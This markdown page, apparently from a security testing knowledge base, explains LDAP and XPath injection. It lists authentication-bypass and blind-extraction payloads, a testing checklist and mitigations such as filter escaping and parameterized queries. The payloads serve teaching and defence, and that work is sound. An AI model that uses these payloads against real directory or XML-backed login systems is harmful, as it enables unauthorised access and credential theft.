# LDAP / XPath Injection

Manipulate directory and XML query syntax.

## How It Works

LDAP and XPath injection insert metacharacters into directory or XML queries constructed from user input—analogous to SQLi for LDAP filters and XPath expressions.

**LDAP** login filters:

```
(&(uid=USER)(password=PASS))
```

Input `*)(uid=*))(|(uid=*` can close predicates and inject OR conditions.

LDAP special characters: `*`, `(`, `)`, backslash, NUL.

**XPath** queries selecting nodes:

```xpath
//users/user[name='$name' and password='$pass']
```

Quote injection: `name' or '1'='1` bypasses authentication or extracts document content.

Blind XPath infers data by boolean queries (`substring(password,1,1)='a'`) when errors are suppressed.

## Exploitation

**LDAP auth bypass**

```
username: *
password: *
# or
username: admin)(&)
password: *
```

**LDAP enumeration**

```
(&(uid=*)(userPassword=*))  via injection in search fields
```

**XPath auth bypass**

```
' or '1'='1
' or 1=1 or '
```

**Data extraction (XPath)**

```
' or substring(//user/password,1,1)='a' or '
```

Compare true/false responses across character positions.

**Attack flow**

```
Injected metacharacters in filter/expression → query logic altered → auth bypass / attribute dump
```

**Tools**

- Burp manual payloads; ldapdomaindump after creds
- XPath injection fuzz lists from PayloadsAllTheThings

## Defense & Mitigation

**Parameterized APIs**

- LDAP: use libraries that escape filters per RFC 4515 (`ldap.filter.escape_filter_chars`).
- XPath: use parameterized XPath APIs with variable binding, not string concat.

**Input validation**

- Allow-list username charset (alphanumeric); reject `()*\`.

**Least privilege**

- LDAP bind accounts with read-only search on required attributes only.
- XML documents queried should not contain secrets in same document as public data.

**Error handling**

- No LDAP/XPath errors to client.

**Alternative**

- Prefer modern auth protocols (OIDC) over custom LDAP filter login forms.

## Methodology

- [ ] Identify search and login filters using LDAP/XPath
- [ ] Test wildcard and boolean injection
- [ ] Extract attributes via blind inference
- [ ] Validate input encoding bypasses

## Tools

| Tool | Usage |
|------|-------|
| `burp` | [Intercept, repeater & scanner](../../TOOLS_GUIDE.md#burp-suite) |
| `manual payloads` | [Craft payloads from OWASP cheat sheets](../../TOOLS_GUIDE.md) |

## Resources

- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)

## Verification Checklist

- [ ] Review scope and rules of engagement
- [ ] Document baseline behavior
- [ ] Test edge cases and parser differentials
- [ ] Capture proof-of-concept safely
- [ ] Write remediation guidance
